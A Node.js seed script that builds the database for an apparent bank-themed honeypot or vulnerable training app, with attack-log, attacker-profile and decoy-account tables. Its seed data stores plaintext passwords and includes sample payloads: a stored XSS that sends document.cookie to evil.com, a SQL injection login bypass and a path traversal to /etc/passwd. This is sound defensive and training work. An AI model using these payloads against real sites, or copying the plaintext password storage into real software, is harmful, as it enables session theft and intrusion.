const pool = require('./db/connection');
require('dotenv').config();

const initializeDatabase = async () => {
  try {
    console.log('🔄 Starting database initialization...');

    // Drop existing tables if they exist (in correct order to avoid foreign key errors)
    const dropTables = `
      DROP TABLE IF EXISTS transaction_alerts CASCADE;
      DROP TABLE IF EXISTS support_tickets CASCADE;
      DROP TABLE IF EXISTS comments CASCADE;
      DROP TABLE IF EXISTS loans CASCADE;
      DROP TABLE IF EXISTS transactions CASCADE;
      DROP TABLE IF EXISTS ioc_records CASCADE;
      DROP TABLE IF EXISTS session_replays CASCADE;
      DROP TABLE IF EXISTS attack_logs CASCADE;
      DROP TABLE IF EXISTS attacker_profiles CASCADE;
      DROP TABLE IF EXISTS users CASCADE;
      DROP TABLE IF EXISTS employees CASCADE;
      DROP TABLE IF EXISTS branches CASCADE;
      DROP TABLE IF EXISTS roles CASCADE;
    `;

    console.log('📋 Dropping existing tables...');
    await pool.query(dropTables);
    console.log('✓ Dropped existing tables');

    // Create roles table
    console.log('🔨 Creating roles table...');
    await pool.query(`
      CREATE TABLE roles (
          role_id SERIAL PRIMARY KEY,
          role_name VARCHAR(50) UNIQUE NOT NULL,
          role_description TEXT,
          permission_level INTEGER DEFAULT 1
      )
    `);

    // Create branches table
    console.log('🏢 Creating branches table...');
    await pool.query(`
      CREATE TABLE branches (
          branch_id SERIAL PRIMARY KEY,
          branch_code VARCHAR(10) UNIQUE NOT NULL,
          branch_name VARCHAR(200) NOT NULL,
          address TEXT,
          city VARCHAR(100),
          state VARCHAR(100),
          country VARCHAR(100),
          phone VARCHAR(20),
          manager_name VARCHAR(100),
          is_active BOOLEAN DEFAULT TRUE,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    // Create users table (customers)
    console.log('👥 Creating users table...');
    await pool.query(`
      CREATE TABLE users (
          user_id SERIAL PRIMARY KEY,
          username VARCHAR(100) UNIQUE NOT NULL,
          password VARCHAR(100) NOT NULL,
          email VARCHAR(200),
          phone VARCHAR(20),
          full_name VARCHAR(200),
          date_of_birth DATE,
          ssn VARCHAR(20),
          address TEXT,
          branch_id INTEGER REFERENCES branches(branch_id),
          account_type VARCHAR(50) DEFAULT 'savings',
          account_number VARCHAR(20) UNIQUE,
          account_balance DECIMAL(15,2) DEFAULT 0.00,
          credit_score INTEGER DEFAULT 650,
          is_active BOOLEAN DEFAULT TRUE,
          is_locked BOOLEAN DEFAULT FALSE,
          failed_login_attempts INTEGER DEFAULT 0,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          last_login TIMESTAMP
      )
    `);

    // Create employees table
    console.log('💼 Creating employees table...');
    await pool.query(`
      CREATE TABLE employees (
          employee_id SERIAL PRIMARY KEY,
          employee_code VARCHAR(20) UNIQUE NOT NULL,
          username VARCHAR(100) UNIQUE NOT NULL,
          password VARCHAR(100) NOT NULL,
          full_name VARCHAR(200),
          email VARCHAR(200),
          phone VARCHAR(20),
          role_id INTEGER REFERENCES roles(role_id),
          branch_id INTEGER REFERENCES branches(branch_id),
          is_active BOOLEAN DEFAULT TRUE,
          can_approve_loans BOOLEAN DEFAULT FALSE,
          can_reset_passwords BOOLEAN DEFAULT FALSE,
          transaction_limit DECIMAL(15,2) DEFAULT 10000.00,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          last_login TIMESTAMP
      )
    `);

    // Create attack_logs table according to request schema
    console.log('🚨 Creating attack_logs table...');
    await pool.query(`
      CREATE TABLE attack_logs (
          id SERIAL PRIMARY KEY,
          timestamp TIMESTAMPTZ DEFAULT NOW(),
          source_ip VARCHAR(45),
          source_port INTEGER,
          method VARCHAR(10),
          path TEXT,
          payload TEXT,
          attack_type VARCHAR(50),
          severity VARCHAR(20),
          user_agent TEXT,
          tool_detected VARCHAR(100),
          os_fingerprint VARCHAR(100),
          session_id VARCHAR(100),
          response_code INTEGER
      )
    `);

    // Create attacker_profiles table according to request schema
    console.log('👹 Creating attacker_profiles table...');
    await pool.query(`
      CREATE TABLE attacker_profiles (
          ip                VARCHAR(45) PRIMARY KEY,
          first_seen        TIMESTAMPTZ,
          last_seen         TIMESTAMPTZ,
          total_requests    INTEGER DEFAULT 0,
          threat_score      INTEGER DEFAULT 0,
          country           VARCHAR(100),
          city              VARCHAR(100),
          isp               VARCHAR(200),
          os                VARCHAR(100),
          tool              VARCHAR(100),
          is_known_malicious BOOLEAN DEFAULT FALSE,
          sqli_count        INTEGER DEFAULT 0,
          xss_count         INTEGER DEFAULT 0,
          bruteforce_count  INTEGER DEFAULT 0,
          traversal_count   INTEGER DEFAULT 0
      )
    `);

    // Create session_replays table
    console.log('📼 Creating session_replays table...');
    await pool.query(`
      CREATE TABLE session_replays (
          session_id      VARCHAR(100) PRIMARY KEY,
          ip              VARCHAR(45),
          created_at      TIMESTAMPTZ DEFAULT NOW(),
          actions         TEXT
      )
    `);

    // Create comments table
    console.log('💬 Creating comments table...');
    await pool.query(`
      CREATE TABLE comments (
          comment_id SERIAL PRIMARY KEY,
          author VARCHAR(100),
          author_type VARCHAR(20),
          content TEXT,
          target_type VARCHAR(50),
          target_id INTEGER,
          is_approved BOOLEAN DEFAULT FALSE,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          ip_address VARCHAR(45),
          user_agent TEXT
      )
    `);

    // Create ioc_records table
    console.log('📊 Creating ioc_records table...');
    await pool.query(`
      CREATE TABLE ioc_records (
          id SERIAL PRIMARY KEY,
          ip VARCHAR(45),
          attack_types TEXT,
          first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          threat_score INTEGER,
          reported_to_abuseipdb BOOLEAN DEFAULT FALSE,
          blocked_automatically BOOLEAN DEFAULT FALSE,
          blocked_at TIMESTAMP,
          notes TEXT
      )
    `);

    // Create support_tickets table
    console.log('🎫 Creating support_tickets table...');
    await pool.query(`
      CREATE TABLE support_tickets (
          ticket_id SERIAL PRIMARY KEY,
          ticket_ref VARCHAR(20) UNIQUE,
          user_id INTEGER REFERENCES users(user_id),
          subject VARCHAR(200),
          message TEXT,
          status VARCHAR(20) DEFAULT 'open',
          priority VARCHAR(10) DEFAULT 'medium',
          assigned_to INTEGER REFERENCES employees(employee_id),
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          resolved_at TIMESTAMP,
          ip_address VARCHAR(45)
      )
    `);

    // Create transactions table
    console.log('💰 Creating transactions table...');
    await pool.query(`
      CREATE TABLE transactions (
          transaction_id SERIAL PRIMARY KEY,
          transaction_ref VARCHAR(50) UNIQUE,
          from_user_id INTEGER REFERENCES users(user_id),
          to_user_id INTEGER REFERENCES users(user_id),
          from_account VARCHAR(20),
          to_account VARCHAR(20),
          amount DECIMAL(15,2),
          transaction_type VARCHAR(50),
          status VARCHAR(20) DEFAULT 'pending',
          remarks TEXT,
          approved_by INTEGER REFERENCES employees(employee_id),
          ip_address VARCHAR(45),
          user_agent TEXT,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          completed_at TIMESTAMP
      )
    `);

    // Create loans table
    console.log('📈 Creating loans table...');
    await pool.query(`
      CREATE TABLE loans (
          loan_id SERIAL PRIMARY KEY,
          loan_ref VARCHAR(50) UNIQUE,
          user_id INTEGER REFERENCES users(user_id),
          loan_amount DECIMAL(15,2),
          interest_rate DECIMAL(5,2),
          tenure_months INTEGER,
          monthly_emi DECIMAL(10,2),
          remaining_amount DECIMAL(15,2),
          status VARCHAR(20) DEFAULT 'pending',
          purpose TEXT,
          approved_by INTEGER REFERENCES employees(employee_id),
          approved_at TIMESTAMP,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    // Create transaction_alerts table
    console.log('⚠️ Creating transaction_alerts table...');
    await pool.query(`
      CREATE TABLE transaction_alerts (
          alert_id SERIAL PRIMARY KEY,
          transaction_id INTEGER REFERENCES transactions(transaction_id),
          alert_type VARCHAR(50),
          severity INTEGER CHECK (severity BETWEEN 1 AND 10),
          description TEXT,
          is_resolved BOOLEAN DEFAULT FALSE,
          resolved_by INTEGER REFERENCES employees(employee_id),
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          resolved_at TIMESTAMP
      )
    `);

    // Create indexes
    console.log('🔍 Creating indexes...');
    await pool.query(`
      CREATE INDEX idx_attack_logs_ip ON attack_logs(source_ip);
      CREATE INDEX idx_attack_logs_timestamp ON attack_logs(timestamp);
      CREATE INDEX idx_attack_logs_attack_type ON attack_logs(attack_type);
      CREATE INDEX idx_transactions_user ON transactions(from_user_id, to_user_id);
      CREATE INDEX idx_users_branch ON users(branch_id);
      CREATE INDEX idx_employees_role ON employees(role_id);
      CREATE INDEX idx_attacker_profiles_threat ON attacker_profiles(threat_score DESC);
    `);

    // Insert sample data
    console.log('📝 Inserting sample data...');

    // Insert roles
    await pool.query(`
      INSERT INTO roles (role_name, role_description, permission_level) VALUES
      ('customer', 'Regular bank customer', 1),
      ('teller', 'Bank teller - can process transactions', 5),
      ('branch_manager', 'Branch manager - can approve loans', 8),
      ('security_officer', 'Security team - can block IPs', 9),
      ('system_admin', 'Full system access', 10)
    `);

    // Insert branches
    await pool.query(`
      INSERT INTO branches (branch_code, branch_name, address, city, state, country, phone, manager_name) VALUES
      ('BR001', 'Downtown Main Branch', '123 Financial District', 'New York', 'NY', 'USA', '+1-212-555-0100', 'Michael Chen'),
      ('BR002', 'Westside Banking Center', '456 West Avenue', 'Los Angeles', 'CA', 'USA', '+1-310-555-0200', 'Sarah Johnson'),
      ('BR003', 'North Regional Hub', '789 North Street', 'Chicago', 'IL', 'USA', '+1-312-555-0300', 'David Williams')
    `);

    // Insert employees
    await pool.query(`
      INSERT INTO employees (employee_code, username, password, full_name, email, phone, role_id, branch_id, can_approve_loans, can_reset_passwords, transaction_limit) VALUES
      ('EMP001', 'michael.chen', 'michael123', 'Michael Chen', 'michael.chen@securebank.com', '+1-212-555-0101', 
       (SELECT role_id FROM roles WHERE role_name = 'branch_manager'), 1, TRUE, TRUE, 50000.00),
      ('EMP002', 'sarah.johnson', 'sarah456', 'Sarah Johnson', 'sarah.johnson@securebank.com', '+1-310-555-0201',
       (SELECT role_id FROM roles WHERE role_name = 'branch_manager'), 2, TRUE, TRUE, 50000.00),
      ('EMP003', 'john.teller', 'teller123', 'John Smith', 'john.smith@securebank.com', '+1-212-555-0102',
       (SELECT role_id FROM roles WHERE role_name = 'teller'), 1, FALSE, FALSE, 10000.00),
      ('EMP004', 'security.analyst', 'security456', 'Emma Davis', 'emma.davis@securebank.com', '+1-212-555-0103',
       (SELECT role_id FROM roles WHERE role_name = 'security_officer'), 1, FALSE, TRUE, 0.00),
      ('EMP005', 'admin.user', 'admin123', 'Admin User', 'admin@securebank.com', '+1-000-555-0000',
       (SELECT role_id FROM roles WHERE role_name = 'system_admin'), 1, TRUE, TRUE, 999999.99)
    `);

    // Insert test users
    await pool.query(`
      INSERT INTO users (user_id, username, password, email, phone, full_name, date_of_birth, ssn, address, branch_id, account_number, account_balance, credit_score) VALUES
      (9999, 'decoy_sec_admin', 'decoy123', 'sec-admin@securebank-decoy.com', '+1-000-555-9999', 'Decoy Secret Administrator', '1980-01-01', '999-99-9999', '999 Decoy Lane, NY', 1, 'ACC99999', 5543209.50, 850),
      (1, 'john_doe', 'password123', 'john.doe@email.com', '+1-212-555-1001', 'John Doe', '1985-03-15', '123-45-6789', '123 Home Street, NY', 1, 'ACC10001', 15420.50, 720),
      (2, 'jane_smith', 'qwerty456', 'jane.smith@email.com', '+1-310-555-1002', 'Jane Smith', '1990-07-22', '987-65-4321', '456 Oak Avenue, CA', 2, 'ACC10002', 89300.75, 785),
      (3, 'robert_brown', 'brown2024', 'robert.brown@email.com', '+1-312-555-1003', 'Robert Brown', '1978-11-30', '555-12-3456', '789 Pine Road, IL', 3, 'ACC10003', 12500.00, 650),
      (4, 'admin', 'admin', 'admin@securebank.com', '+1-212-555-1005', 'Admin User', '1980-01-01', '111-22-3333', '999 Admin Lane, NY', 1, 'ACC10999', 999999.99, 850),
      (5, 'testuser', 'testpass', 'test@email.com', '+1-212-555-1006', 'Test User', '1995-12-25', '999-88-7777', '123 Test Street, NY', 1, 'ACC10005', 2500.00, 600)
    `);

    // Insert transactions
    await pool.query(`
      INSERT INTO transactions (transaction_ref, from_user_id, to_user_id, from_account, to_account, amount, transaction_type, status, remarks, completed_at) VALUES
      ('TXN99001', NULL, 9999, 'FEDERAL_RESERVE', 'ACC99999', 5000000.00, 'Income', 'Completed', 'Initial Treasury Allocation', NOW()),
      ('TXN99002', NULL, 9999, 'CHASE_SETTLEMENT', 'ACC99999', 1000000.00, 'Income', 'Completed', 'Interbank Liquidity Settlement', NOW()),
      ('TXN99003', 9999, NULL, 'ACC99999', 'CORP_FIREEYE_INC', 250000.00, 'Wire', 'Completed', 'Bulk Security Infrastructure Invoice', NOW()),
      ('TXN99004', 9999, NULL, 'ACC99999', 'CORP_DELL_SEC', 206790.50, 'Wire', 'Completed', 'Encrypted Hardware Server Procurement', NOW()),
      ('TXN10001', NULL, 1, 'PAYROLL_ACME_CORP', 'ACC10001', 18000.00, 'Income', 'Completed', 'Payroll Credit - Acme Corp', NOW()),
      ('TXN10002', 1, NULL, 'ACC10001', 'APARTMENT_RENTAL', 1200.00, 'Expense', 'Completed', 'Monthly Rental Payment', NOW()),
      ('TXN10003', 1, NULL, 'ACC10001', 'AUTO_FINANCE_EMI', 1379.50, 'Expense', 'Completed', 'Auto Loan EMI Payment', NOW()),
      ('TXN20001', NULL, 2, 'PAYROLL_TECH_CORP', 'ACC10002', 95000.00, 'Income', 'Completed', 'Payroll Credit - Tech Corp', NOW()),
      ('TXN20002', 2, NULL, 'ACC10002', 'CORP_INVESTMENT', 5699.25, 'Expense', 'Completed', 'Mutual Fund Investment Portfolio', NOW())
    `);

    // Insert comments
    await pool.query(`
      INSERT INTO comments (author, author_type, content, target_type, ip_address) VALUES
      ('John Doe', 'customer', 'Great banking platform! Very secure.', 'feedback', '192.168.1.100'),
      ('Jane Smith', 'customer', 'Love the new mobile app features.', 'feedback', '192.168.1.101'),
      ('hacker', 'guest', '<script>alert("XSS Attack!")</script>', 'support_ticket', '10.0.0.50'),
      ('attacker', 'guest', '<img src="invalid" onerror="fetch(''http://evil.com/steal?cookie=''+document.cookie)">', 'feedback', '10.0.0.60')
    `);

    // Insert attack logs
    await pool.query(`
      INSERT INTO attack_logs (source_ip, method, path, payload, attack_type, severity, tool_detected, response_code) VALUES
      ('192.168.1.200', 'POST', '/api/login', 'username=admin%27+OR+%271%27%3D%271&password=anything', 'sqli', 'HIGH', 'SQLMap', 200),
      ('10.0.0.55', 'GET', '/api/search', 'q=<script>alert(document.cookie)</script>', 'xss', 'HIGH', 'Manual', 200),
      ('192.168.1.201', 'GET', '/api/download', 'file=../../../etc/passwd', 'traversal', 'HIGH', 'DirBuster', 200)
    `);

    // Insert seeded attacker profiles
    await pool.query(`
      INSERT INTO attacker_profiles (ip, country, city, isp, os, tool, threat_score, sqli_count, xss_count, traversal_count, first_seen, last_seen) VALUES
      ('192.168.1.200', 'United States', 'Washington', 'Comcast', 'Linux', 'SQLMap', 85, 1, 0, 0, NOW(), NOW()),
      ('10.0.0.55', 'Germany', 'Berlin', 'Deutsche Telekom', 'Windows', 'Manual', 70, 0, 1, 0, NOW(), NOW()),
      ('192.168.1.201', 'Pakistan', 'Lahore', 'PTCL', 'Linux', 'DirBuster', 65, 0, 0, 1, NOW(), NOW())
    `);

    console.log('\n✅ Database initialized successfully!');
    console.log('\n📝 Test Credentials:');
    console.log('  Username: admin          Password: admin');
    console.log('  Username: john_doe       Password: password123');
    console.log('  Username: jane_smith     Password: qwerty456');
    console.log('  Username: robert_brown   Password: brown2024');

    process.exit(0);
  } catch (error) {
    console.error('❌ Error initializing database:', error);
    process.exit(1);
  }
};

initializeDatabase();
